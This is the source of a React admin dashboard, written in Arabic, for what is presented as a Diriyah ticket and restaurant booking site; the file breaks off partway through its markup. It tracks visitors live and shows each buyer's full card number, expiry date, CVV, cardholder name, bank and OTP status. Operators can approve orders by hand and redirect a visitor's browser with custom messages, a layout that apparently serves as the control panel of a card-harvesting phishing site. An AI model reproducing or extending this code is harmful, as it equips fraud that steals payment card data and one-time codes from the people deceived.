import { useState, useEffect, useRef } from "react";
import { Users, MapPin, Clock, Monitor, Smartphone, Globe, Wifi, WifiOff, Eye, Trash2, CheckSquare, Square, AlertCircle, Bell, UserPlus, Navigation, MessageSquare, UtensilsCrossed, Ticket, MousePointer, ChevronDown, Send, RotateCcw, Archive, ShoppingBag, CalendarCheck, CreditCard, Shield, CheckCircle, XCircle, X } from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { supabase } from "@/integrations/supabase/client";
import { playChime, createRipple } from "@/hooks/use-action-sound";

const sitePages = [
  { path: "/", label: "الصفحة الرئيسية" },
  { path: "/about", label: "عن الدرعية" },
  { path: "/places", label: "الأماكن" },
  { path: "/experiences", label: "التجارب" },
  { path: "/restaurants", label: "المطاعم" },
  { path: "/tickets", label: "التذاكر" },
  { path: "/events", label: "الفعاليات" },
  { path: "/contact", label: "تواصل معنا" },
  { path: "/plan", label: "خطط زيارتك" },
  { path: "/checkout", label: "شراء التذاكر" },
  { path: "/articles", label: "المقالات" },
];

const notificationTypes = [
  { key: "welcome", label: "ترحيب 👋", icon: "👋", color: "bg-emerald-500" },
  { key: "offer", label: "عرض خاص 🎁", icon: "🎁", color: "bg-amber-500" },
  { key: "alert", label: "تنبيه ⚠️", icon: "⚠️", color: "bg-red-500" },
  { key: "info", label: "توجيه 📍", icon: "📍", color: "bg-violet-500" },
];

interface Visitor {
  id: string;
  session_id: string;
  name: string;
  email: string | null;
  phone: string | null;
  device: string;
  browser: string;
  country: string;
  current_page: string;
  current_page_label: string;
  is_online: boolean;
  last_seen: string;
  total_visits: number;
  pages_viewed: number;
  session_start: string;
  created_at: string;
  ip_address: string | null;
}

interface VisitorAction {
  id: string;
  action_type: string;
  action_detail: string | null;
  page: string | null;
  created_at: string;
}

interface VisitorOrder {
  id: string;
  confirmation_number: string | null;
  total: number;
  status: string;
  created_at: string;
  tickets: any;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  payment_method: string;
  email: string | null;
  phone: string | null;
  subtotal: number | null;
  vat: number | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

interface VisitorBooking {
  id: string;
  restaurant: string;
  booking_date: string;
  guests: number;
  status: string;
  created_at: string;
}

// شريط التنبيه الجانبي
interface SideAlert {
  id: string;
  visitorName: string;
  actionLabel: string;
  actionIcon: string;
  isNew: boolean;
  timestamp: number;
}

const AdminVisitors = () => {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
  const [selected, setSelected] = useState<Visitor | null>(null);
  const [selectedActions, setSelectedActions] = useState<VisitorAction[]>([]);
  const [visitorOrders, setVisitorOrders] = useState<VisitorOrder[]>([]);
  const [visitorBookings, setVisitorBookings] = useState<VisitorBooking[]>([]);
  const [filter, setFilter] = useState<"all" | "online" | "offline">("all");
  const [showTrash, setShowTrash] = useState(false);
  const [selectMode, setSelectMode] = useState(false);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [confirmDelete, setConfirmDelete] = useState<{ type: "single" | "selected" | "all"; id?: string } | null>(null);
  const [redirectNotifType, setRedirectNotifType] = useState<string>("info");
  const [redirectPath, setRedirectPath] = useState<string>("");
  const [redirectMessage, setRedirectMessage] = useState<string>("");
  const [sideAlerts, setSideAlerts] = useState<SideAlert[]>([]);
  const [flashVisitorId, setFlashVisitorId] = useState<string | null>(null);
  const alertTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});

  // إضافة تنبيه جانبي
  const addSideAlert = (alert: Omit<SideAlert, "id" | "timestamp">) => {
    const id = Math.random().toString(36).slice(2);
    const newAlert: SideAlert = { ...alert, id, timestamp: Date.now() };
    setSideAlerts(prev => [newAlert, ...prev].slice(0, 5));
    // إزالة تلقائية بعد 6 ثوانٍ
    alertTimers.current[id] = setTimeout(() => {
      setSideAlerts(prev => prev.filter(a => a.id !== id));
      delete alertTimers.current[id];
    }, 6000);
  };

  const removeSideAlert = (id: string) => {
    if (alertTimers.current[id]) {
      clearTimeout(alertTimers.current[id]);
      delete alertTimers.current[id];
    }
    setSideAlerts(prev => prev.filter(a => a.id !== id));
  };

  const handleConfirmPermanentDelete = async () => {
    if (!confirmDelete) return;
    if (confirmDelete.type === "single" && confirmDelete.id) {
      await permanentDeleteSingle(confirmDelete.id);
    } else if (confirmDelete.type === "selected") {
      await permanentDeleteSelected();
    } else if (confirmDelete.type === "all") {
      await permanentDeleteAll();
    }
    setConfirmDelete(null);
  };

  const fetchVisitors = async () => {
    const { data } = await supabase
      .from("visitors")
      .select("*")
      .order("last_seen", { ascending: false });
    if (data) {
      const now = Date.now();
      const all = data.map(v => ({
        ...v,
        is_online: v.is_online && (now - new Date(v.last_seen).getTime() < 60000),
      }));
      const active = all.filter(v => !(v as any).is_deleted);
      const deleted = all.filter(v => (v as any).is_deleted);
      active.sort((a, b) => {
        const hasInfoA = !!(a.email || a.phone || (a.name && a.name !== "زائر جديد"));
        const hasInfoB = !!(b.email || b.phone || (b.name && b.name !== "زائر جديد"));
        if (hasInfoA !== hasInfoB) return hasInfoB ? 1 : -1;
        if (a.is_online !== b.is_online) return b.is_online ? 1 : -1;
        return new Date(b.last_seen).getTime() - new Date(a.last_seen).getTime();
      });
      setVisitors(active as Visitor[]);
      setDeletedVisitors(deleted as Visitor[]);
      if (selected) {
        const fresh = active.find(v => v.id === selected.id) || deleted.find(v => v.id === selected.id);
        if (fresh) setSelected(fresh as Visitor);
      }
    }
    setLoading(false);
  };

  const fetchActions = async (visitorId: string) => {
    const { data } = await supabase
      .from("visitor_actions")
      .select("*")
      .eq("visitor_id", visitorId)
      .order("created_at", { ascending: false })
      .limit(20);
    if (data) setSelectedActions(data as VisitorAction[]);
  };

  const fetchVisitorOrdersAndBookings = async (visitor: Visitor) => {
    const email = visitor.email;
    const phone = visitor.phone;

    if (email || phone) {
      let ordersQuery = supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
      if (email && phone) {
        ordersQuery = ordersQuery.or(`email.eq.${email},phone.eq.${phone}`);
      } else if (email) {
        ordersQuery = ordersQuery.eq("email", email);
      } else if (phone) {
        ordersQuery = ordersQuery.eq("phone", phone);
      }
      const { data: orders } = await ordersQuery;
      setVisitorOrders((orders || []) as VisitorOrder[]);

      let bookingsQuery = supabase.from("restaurant_bookings").select("*").order("created_at", { ascending: false });
      if (phone) {
        bookingsQuery = bookingsQuery.eq("phone", phone);
      }
      const { data: bookings } = await bookingsQuery;
      setVisitorBookings(phone ? ((bookings || []) as VisitorBooking[]) : []);
      return;
    }

    const { data: actions } = await supabase
      .from("visitor_actions")
      .select("action_type, action_detail")
      .eq("visitor_id", visitor.id)
      .in("action_type", ["ticket_purchase", "restaurant_booking"]);

    if (actions && actions.length > 0) {
      const emails = new Set<string>();
      const phones = new Set<string>();
      actions.forEach(a => {
        const emailMatch = a.action_detail?.match(/\(([^)]+@[^)]+)\)/);
        if (emailMatch) emails.add(emailMatch[1]);
        const phoneMatch = a.action_detail?.match(/(\d{10,})/);
        if (phoneMatch) phones.add(phoneMatch[1]);
      });

      if (emails.size > 0) {
        const { data: orders } = await supabase
          .from("ticket_orders")
          .select("*")
          .in("email", Array.from(emails))
          .order("created_at", { ascending: false });
        setVisitorOrders((orders || []) as VisitorOrder[]);
      } else {
        setVisitorOrders([]);
      }

      if (phones.size > 0) {
        const { data: bookings } = await supabase
          .from("restaurant_bookings")
          .select("*")
          .in("phone", Array.from(phones))
          .order("created_at", { ascending: false });
        setVisitorBookings((bookings || []) as VisitorBooking[]);
      } else {
        setVisitorBookings([]);
      }
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
    }
  };

  useEffect(() => {
    fetchVisitors();
    const channel = supabase
      .channel("visitors-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "visitors" }, (payload: any) => {
        fetchVisitors();
        // تنبيه زائر جديد
        if (payload.eventType === "INSERT") {
          const v = payload.new;
          addSideAlert({
            visitorName: v.name || "زائر جديد",
            actionLabel: "دخل الموقع",
            actionIcon: "👤",
            isNew: true,
          });
        }
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "visitor_actions" }, (payload: any) => {
        const action = payload.new;
        if (selected) fetchActions(selected.id);
        if (action.action_type === "page_view") return;

        const actionLabels: Record<string, { icon: string; label: string }> = {
          new_visitor: { icon: "👤", label: "زائر جديد" },
          contact_form: { icon: "📩", label: "رسالة تواصل" },
          restaurant_booking: { icon: "🍽️", label: "حجز مطعم" },
          ticket_purchase: { icon: "🎟️", label: "شراء تذكرة" },
          newsletter_signup: { icon: "📧", label: "اشتراك نشرة" },
        };
        const info = actionLabels[action.action_type] || { icon: "⚡", label: action.action_type };

        playChime("notification");
        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

        setFlashVisitorId(action.visitor_id);
        setTimeout(() => setFlashVisitorId(null), 3000);

        // إضافة تنبيه جانبي للإجراء
        setVisitors(prev => {
          const v = prev.find(x => x.id === action.visitor_id);
          addSideAlert({
            visitorName: v?.name || "زائر",
            actionLabel: info.label,
            actionIcon: info.icon,
            isNew: false,
          });
          const idx = prev.findIndex(x => x.id === action.visitor_id);
          if (idx <= 0) return prev;
          const copy = [...prev];
          const [moved] = copy.splice(idx, 1);
          copy.unshift(moved);
          return copy;
        });
      })
      .subscribe();
    const interval = setInterval(fetchVisitors, 15000);
    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
      Object.values(alertTimers.current).forEach(clearTimeout);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (selected) {
      fetchActions(selected.id);
      fetchVisitorOrdersAndBookings(selected);
    } else {
      setVisitorOrders([]);
      setVisitorBookings([]);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selected?.id]);

  const onlineCount = visitors.filter(v => v.is_online).length;
  const totalCount = visitors.length;

  const filtered = visitors.filter(v => {
    if (filter === "online") return v.is_online;
    if (filter === "offline") return !v.is_online;
    return true;
  });

  // هل الزائر ينتظر رد (لديه طلب pending)
  const hasPendingAction = (visitor: Visitor) => {
    // نتحقق من الإجراءات - يمكن تحسينه لاحقاً بربط مباشر
    return false; // placeholder - يمكن ربطه بـ orders pending
  };

  const toggleSelect = (id: string) => {
    setSelectedIds(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  };

  const deleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) {
      await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    }
    if (selected && selectedIds.has(selected.id)) setSelected(null);
    setSelectedIds(new Set());
    setSelectMode(false);
    fetchVisitors();
  };

  const deleteAll = async () => {
    playChime("delete");
    const offlineIds = visitors.filter(v => !v.is_online).map(v => v.id);
    if (offlineIds.length === 0) return;
    await supabase.from("visitors").update({ is_deleted: true } as any).in("id", offlineIds);
    if (selected && offlineIds.includes(selected.id)) setSelected(null);
    setSelectedIds(new Set());
    setSelectMode(false);
    fetchVisitors();
  };

  const redirectVisitor = async (visitorId: string, path: string, notifType: string = "info", message: string = "") => {
    playChime("success");
    const redirectValue = message ? `${notifType}:${path}:${message}` : `${notifType}:${path}`;
    await supabase.from("visitors").update({ redirect_to: redirectValue } as any).eq("id", visitorId);
  };

  const deleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitors").update({ is_deleted: true } as any).eq("id", id);
    setSelected(null);
    fetchVisitors();
  };

  const permanentDeleteSingle = async (id: string) => {
    playChime("delete");
    await supabase.from("visitor_actions").delete().eq("visitor_id", id);
    await supabase.from("visitors").delete().eq("id", id);
    fetchVisitors();
  };

  const permanentDeleteSelected = async () => {
    playChime("delete");
    for (const id of selectedIds) {
      await supabase.from("visitor_actions").delete().eq("visitor_id", id);
      await supabase.from("visitors").delete().eq("id", id);
    }
    setSelectedIds(new Set());
    setSelectMode(false);
    fetchVisitors();
  };

  const permanentDeleteAll = async () => {
    playChime("delete");
    for (const v of deletedVisitors) {
      await supabase.from("visitor_actions").delete().eq("visitor_id", v.id);
    }
    const ids = deletedVisitors.map(v => v.id);
    if (ids.length > 0) await supabase.from("visitors").delete().in("id", ids);
    fetchVisitors();
  };

  const restoreVisitor = async (id: string) => {
    playChime("success");
    await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", id);
    fetchVisitors();
  };

  const restoreAllVisitors = async () => {
    playChime("success");
    const ids = deletedVisitors.map(v => v.id);
    if (ids.length === 0) return;
    for (const id of ids) {
      await supabase.from("visitors").update({ is_deleted: false } as any).eq("id", id);
    }
    fetchVisitors();
  };

  const getTimeDiff = (dateStr: string) => {
    const diff = Date.now() - new Date(dateStr).getTime();
    const mins = Math.floor(diff / 60000);
    if (mins < 1) return "الآن";
    if (mins < 60) return `منذ ${mins} دقيقة`;
    const hrs = Math.floor(mins / 60);
    if (hrs < 24) return `منذ ${hrs} ساعة`;
    return `منذ ${Math.floor(hrs / 24)} يوم`;
  };

  const getDuration = (start: string) => {
    const diff = Date.now() - new Date(start).getTime();
    const mins = Math.floor(diff / 60000);
    if (mins < 1) return "أقل من دقيقة";
    if (mins < 60) return `${mins} دقيقة`;
    return `${Math.floor(mins / 60)} ساعة و ${mins % 60} دقيقة`;
  };

  const countryFlag = (name: string): string => {
    const map: Record<string, string> = {
      "Saudi Arabia": "🇸🇦", "United Arab Emirates": "🇦🇪", "Kuwait": "🇰🇼", "Bahrain": "🇧🇭",
      "Qatar": "🇶🇦", "Oman": "🇴🇲", "Egypt": "🇪🇬", "Jordan": "🇯🇴", "Iraq": "🇮🇶",
      "Lebanon": "🇱🇧", "Syria": "🇸🇾", "Palestine": "🇵🇸", "Yemen": "🇾🇪", "Libya": "🇱🇾",
      "Tunisia": "🇹🇳", "Algeria": "🇩🇿", "Morocco": "🇲🇦", "Sudan": "🇸🇩", "Somalia": "🇸🇴",
      "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Germany": "🇩🇪", "France": "🇫🇷",
      "Canada": "🇨🇦", "Australia": "🇦🇺", "India": "🇮🇳", "China": "🇨🇳", "Japan": "🇯🇵",
      "South Korea": "🇰🇷", "Turkey": "🇹🇷", "Pakistan": "🇵🇰", "Indonesia": "🇮🇩",
      "Malaysia": "🇲🇾", "Brazil": "🇧🇷", "Mexico": "🇲🇽", "Italy": "🇮🇹", "Spain": "🇪🇸",
      "Netherlands": "🇳🇱", "Sweden": "🇸🇪", "Norway": "🇳🇴", "Denmark": "🇩🇰",
      "Russia": "🇷🇺", "South Africa": "🇿🇦", "Nigeria": "🇳🇬", "Singapore": "🇸🇬",
      "Thailand": "🇹🇭", "Philippines": "🇵🇭", "Bangladesh": "🇧🇩", "Sri Lanka": "🇱🇰",
      "Iran": "🇮🇷", "Afghanistan": "🇦🇫", "Mauritania": "🇲🇷", "Djibouti": "🇩🇯",
      "Comoros": "🇰🇲", "Ireland": "🇮🇪", "Switzerland": "🇨🇭", "Austria": "🇦🇹",
      "Belgium": "🇧🇪", "Portugal": "🇵🇹", "Greece": "🇬🇷", "Poland": "🇵🇱",
      "New Zealand": "🇳🇿", "Argentina": "🇦🇷", "Colombia": "🇨🇴", "Chile": "🇨🇱",
      "Finland": "🇫🇮", "Czech Republic": "🇨🇿", "Romania": "🇷🇴", "Hungary": "🇭🇺",
    };
    return map[name] || "🌍";
  };

  const statusLabel = (s: string) => {
    const map: Record<string, { text: string; color: string }> = {
      confirmed: { text: "مؤكد", color: "text-emerald-600 bg-emerald-50" },
      pending: { text: "قيد الانتظار", color: "text-amber-600 bg-amber-50" },
      cancelled: { text: "ملغي", color: "text-red-600 bg-red-50" },
      rejected: { text: "مرفوض", color: "text-red-600 bg-red-50" },
    };
    return map[s] || { text: s, color: "text-slate-600 bg-slate-50" };
  };

  const updateOrderStatus = async (orderId: string, status: string) => {
    playChime("success");
    await supabase.from("ticket_orders").update({ status }).eq("id", orderId);
    setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status } : o));
  };

  const renderPaymentInfo = (compact: boolean) => {
    const ordersWithCard = visitorOrders.filter(o => o.card_last4 || o.card_brand || o.cardholder_name || o.card_full_number);
    if (ordersWithCard.length === 0) return null;
    const textSm = compact ? "text-[11px]" : "text-[12px]";
    const textXs = compact ? "text-[9px]" : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    const formatCardNumber = (num: string) =>
      num.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();

    return (
      <div className="border border-sky-100 rounded-xl overflow-hidden">
        <div className="bg-sky-50 px-3 py-1.5 flex items-center gap-1.5">
          <Shield className="w-3.5 h-3.5 text-sky-500" />
          <span className={`${textSm} font-semibold text-sky-600`}>معلومات الدفع</span>
        </div>
        <div className={`${pad} space-y-3`}>
          {ordersWithCard.map(order => (
            <div key={order.id} className="space-y-2">
              <div className="flex items-center justify-between">
                <span className={`${textXs} text-slate-400`}>{order.confirmation_number || order.id.slice(0, 8)}</span>
                <span className={`${textXs} font-medium px-1.5 py-0.5 rounded-full ${statusLabel(order.status).color}`}>
                  {statusLabel(order.status).text}
                </span>
              </div>
              <div className="bg-slate-800 rounded-xl p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <span className={`${textXs} text-slate-400`}>رقم البطاقة</span>
                  <span className={`${textSm} font-mono font-bold text-white tracking-widest`} dir="ltr">
                    {order.card_full_number
                      ? formatCardNumber(order.card_full_number)
                      : `•••• •••• •••• ${order.card_last4 || "----"}`}
                  </span>
                </div>
                {order.card_expiry && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>تاريخ الانتهاء</span>
                    <span className={`${textSm} font-mono font-bold text-white`} dir="ltr">{order.card_expiry}</span>
                  </div>
                )}
                {order.card_cvv && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>CVV</span>
                    <span className={`${textSm} font-mono font-bold text-amber-400`} dir="ltr">{order.card_cvv}</span>
                  </div>
                )}
                {order.cardholder_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>حامل البطاقة</span>
                    <span className={`${textSm} font-semibold text-white`}>{order.cardholder_name}</span>
                  </div>
                )}
                {order.bank_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>البنك</span>
                    <span className={`${textSm} font-medium text-sky-300`}>{order.bank_name}</span>
                  </div>
                )}
                {order.card_brand && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>نوع البطاقة</span>
                    <span className={`${textSm} font-bold text-amber-400 uppercase`}>{order.card_brand}</span>
                  </div>
                )}
                <div className="border-t border-slate-600 pt-2 flex items-center justify-between">
                  <span className={`${textXs} text-slate-400`}>المبلغ الإجمالي</span>
                  <span className={`${textSm} font-bold text-emerald-400`}>{order.total} ر.س</span>
                </div>
              </div>
              <div className="bg-slate-50 rounded-xl p-2.5 space-y-1.5">
                <span className={`${textXs} font-semibold text-slate-500 block mb-1`}>بيانات الزائر</span>
                {order.email && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>البريد الإلكتروني</span>
                    <span className={`${textXs} font-medium text-slate-700`} dir="ltr">{order.email}</span>
                  </div>
                )}
                {order.phone && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>رقم الجوال</span>
                    <span className={`${textXs} font-medium text-slate-700`} dir="ltr">{order.phone}</span>
                  </div>
                )}
                {order.subtotal != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>المجموع الفرعي</span>
                    <span className={`${textXs} font-medium text-slate-700`}>{order.subtotal} ر.س</span>
                  </div>
                )}
                {order.vat != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${textXs} text-slate-400`}>ضريبة القيمة المضافة</span>
                    <span className={`${textXs} font-medium text-slate-700`}>{order.vat} ر.س</span>
                  </div>
                )}
                {order.tickets && Array.isArray(order.tickets) && order.tickets.length > 0 && (
                  <div className="mt-1 pt-1 border-t border-slate-200">
                    <span className={`${textXs} font-semibold text-slate-500 block mb-1`}>التذاكر</span>
                    {order.tickets.map((t: any, i: number) => (
                      <div key={i} className="flex items-center justify-between">
                        <span className={`${textXs} text-slate-600`}>{t.name || t.id}</span>
                        <span className={`${textXs} text-slate-500`}>{t.qty} × {t.price} ر.س</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              <div className={`flex items-center justify-center gap-1.5 py-1.5 rounded-lg ${textXs} font-semibold ${
                order.status === "confirmed" ? "bg-emerald-50 text-emerald-600" : "bg-red-50 text-red-500"
              }`}>
                {order.status === "confirmed"
                  ? <><CheckCircle className="w-3 h-3" /> OTP تم التحقق ✓</>
                  : <><XCircle className="w-3 h-3" /> OTP لم يتم التحقق</>}
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  };

  const renderOrdersBookings = (compact: boolean) => {
    if (visitorOrders.length === 0 && visitorBookings.length === 0) return null;
    const textSm = compact ? "text-[11px]" : "text-[12px]";
    const textXs = compact ? "text-[9px]" : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";
    return (
      <>
        {visitorOrders.length > 0 && (
          <div className="border border-purple-100 rounded-xl overflow-hidden">
            <div className="bg-purple-50 px-3 py-1.5 flex items-center gap-1.5">
              <ShoppingBag className="w-3.5 h-3.5 text-purple-500" />
              <span className={`${textSm} font-semibold text-purple-600`}>الطلبات ({visitorOrders.length})</span>
            </div>
            <div className={`${pad} space-y-1.5 max-h-[280px] overflow-y-auto`}>
              {visitorOrders.map(order => {
                const st = statusLabel(order.status);
                const isPending = order.status !== "confirmed" && order.status !== "rejected";
                return (
                  <div key={order.id} className="bg-slate-50 rounded-lg p-2.5 space-y-1.5">
                    <div className="flex items-center gap-2">
                      <Ticket className="w-4 h-4 text-purple-400 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className={`${textSm} font-medium text-slate-700`}>
                            {order.confirmation_number || order.id.slice(0, 8)}
                          </span>
                          <span className={`${textXs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                        </div>
                        <div className="flex items-center gap-2 mt-0.5">
                          <span className={`${textXs} text-slate-500`}>{order.total} ر.س</span>
                          <span className={`${textXs} text-slate-400`}>{getTimeDiff(order.created_at)}</span>
                        </div>
                      </div>
                    </div>
                    {isPending ? (
                      <div className="flex gap-1.5">
                        <button
                          onClick={() => updateOrderStatus(order.id, "confirmed")}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-emerald-50 text-emerald-600 ${textXs} font-semibold hover:bg-emerald-100 transition-colors`}
                        >
                          <CheckCircle className="w-3 h-3" /> قبول
                        </button>
                        <button
                          onClick={() => updateOrderStatus(order.id, "rejected")}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-red-50 text-red-500 ${textXs} font-semibold hover:bg-red-100 transition-colors`}
                        >
                          <XCircle className="w-3 h-3" /> رفض
                        </button>
                      </div>
                    ) : (
                      <div className={`flex items-center justify-center gap-1 py-1.5 rounded-lg ${textXs} font-semibold ${
                        order.status === "confirmed" ? "bg-emerald-50 text-emerald-600" : "bg-red-50 text-red-500"
                      }`}>
                        {order.status === "confirmed" ? <><CheckCircle className="w-3 h-3" /> تم القبول</> : <><XCircle className="w-3 h-3" /> تم الرفض</>}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
        )}
        {visitorBookings.length > 0 && (
          <div className="border border-teal-100 rounded-xl overflow-hidden">
            <div className="bg-teal-50 px-3 py-1.5 flex items-center gap-1.5">
              <CalendarCheck className="w-3.5 h-3.5 text-teal-500" />
              <span className={`${textSm} font-semibold text-teal-600`}>الحجوزات ({visitorBookings.length})</span>
            </div>
            <div className={`${pad} space-y-1.5 max-h-[200px] overflow-y-auto`}>
              {visitorBookings.map(booking => {
                const st = statusLabel(booking.status);
                return (
                  <div key={booking.id} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                    <UtensilsCrossed className="w-4 h-4 text-teal-400 shrink-0" />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <span className={`${textSm} font-medium text-slate-700`}>{booking.restaurant}</span>
                        <span className={`${textXs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                      </div>
                      <div className="flex items-center gap-2 mt-0.5">
                        <span className={`${textXs} text-slate-500`}>{booking.booking_date} · {booking.guests} أشخاص</span>
                        <span className={`${textXs} text-slate-400`}>{getTimeDiff(booking.created_at)}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}
      </>
    );
  };

  const renderActionsLog = (compact: boolean) => {
    if (selectedActions.length === 0) return null;
    const actionStyles: Record<string, { icon: typeof AlertCircle; color: string; bg: string }> = {
      new_visitor: { icon: UserPlus, color: "text-emerald-500", bg: "bg-emerald-50" },
      page_view: { icon: Navigation, color: "text-blue-500", bg: "bg-blue-50" },
      contact_message: { icon: MessageSquare, color: "text-indigo-500", bg: "bg-indigo-50" },
      restaurant_booking: { icon: UtensilsCrossed, color: "text-amber-500", bg: "bg-amber-50" },
      ticket_purchase: { icon: Ticket, color: "text-purple-500", bg: "bg-purple-50" },
    };
    return (
      <div className="border border-amber-100 rounded-xl overflow-hidden">
        <div className={`bg-amber-50 px-${compact ? "3" : "4"} py-${compact ? "1.5" : "2"}`}>
          <span className={`${compact ? "text-[11px]" : "text-[12px]"} font-semibold text-amber-600`}>سجل الإجراءات</span>
        </div>
        <div className={`${compact ? "p-2 space-y-1 max-h-[150px]" : "p-3 space-y-1.5 max-h-[200px]"} overflow-y-auto`}>
          {selectedActions.map(action => {
            const style = actionStyles[action.action_type] || { icon: MousePointer, color: "text-slate-400", bg: "bg-slate-50" };
            const Icon = style.icon;
            return (
              <div key={action.id} className={`flex items-center gap-${compact ? "2" : "2.5"} rounded-lg p-${compact ? "2" : "2.5"} ${style.bg}`}>
                {!compact && (
                  <div className={`w-6 h-6 rounded-md flex items-center justify-center shrink-0 ${style.bg}`}>
                    <Icon className={`w-3.5 h-3.5 ${style.color}`} />
                  </div>
                )}
                {compact && <Icon className={`w-3 h-3 ${style.color} shrink-0`} />}
                <div className="flex-1 min-w-0">
                  <p className={`${compact ? "text-[11px]" : "text-[12px]"} text-slate-700 truncate`}>{action.action_detail}</p>
                  <p className={`${compact ? "text-[9px]" : "text-[10px]"} text-slate-400`}>{getTimeDiff(action.created_at)}</p>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderRedirectDropdown = (visitor: Visitor, compact: boolean) => {
    return (
      <div className="border border-slate-200 rounded-xl overflow-hidden">
        <div className="bg-slate-50 px-3 py-1.5 border-b border-slate-100">
          <span className={`${compact ? "text-[11px]" : "text-[12px]"} font-semibold text-slate-600`}>توجيه لصفحة</span>
        </div>
        <div className="p-2.5 space-y-2">
          <select
            className={`w-full ${compact ? "text-[11px]" : "text-[13px]"} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            value={redirectPath}
            onChange={(e) => setRedirectPath(e.target.value)}
          >
            <option value="" disabled>اختر صفحة</option>
            {sitePages.map(p => (
              <option key={p.path} value={p.path}>{p.label}</option>
            ))}
          </select>
          <input
            type="text"
            placeholder="رسالة مخصصة (اختياري)..."
            value={redirectMessage}
            onChange={(e) => setRedirectMessage(e.target.value)}
            className={`w-full ${compact ? "text-[11px]" : "text-[13px]"} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            dir="rtl"
          />
          <div className="flex items-center gap-1.5">
            {notificationTypes.map(nt => (
              <button
                key={nt.key}
                onClick={() => setRedirectNotifType(nt.key)}
                className={`flex-1 text-[10px] py-1.5 rounded-lg border-2 transition-all hover:opacity-90 active:scale-95 font-medium ${
                  redirectNotifType === nt.key
                    ? `${nt.color} text-white border-transparent shadow-sm`
                    : "bg-white text-slate-500 border-slate-200 hover:border-slate-300"
                }`}
                title={nt.label}
              >
                {nt.icon}
              </button>
            ))}
          </div>
          <button
            onClick={() => {
              if (redirectPath) {
                redirectVisitor(visitor.id, redirectPath, redirectNotifType, redirectMessage.trim());
                setRedirectPath("");
                setRedirectMessage("");
              }
            }}
            className={`w-full ${compact ? "py-2 text-[11px]" : "py-2.5 text-[13px]"} rounded-lg bg-violet-500 text-white font-medium hover:bg-violet-600 active:scale-95 transition-all`}
          >
            توجيه
          </button>
        </div>
      </div>
    );
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-[calc(100vh-120px)]">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-3" />
          <p className="text-[13px] text-slate-400">جاري تحميل الزوار...</p>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* شريط التنبيهات الجانبي - يسار الشاشة */}
      <div className="fixed left-4 top-1/2 -translate-y-1/2 z-50 flex flex-col gap-2 pointer-events-none" style={{ maxWidth: "260px" }}>
        {sideAlerts.map((alert) => (
          <div
            key={alert.id}
            className="pointer-events-auto bg-white border border-slate-200 rounded-xl shadow-lg shadow-slate-200/60 p-3 flex items-center gap-2.5 animate-in slide-in-from-left-4 duration-300"
            style={{ direction: "rtl" }}
          >
            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 text-[16px] ${alert.isNew ? "bg-emerald-50" : "bg-violet-50"}`}>
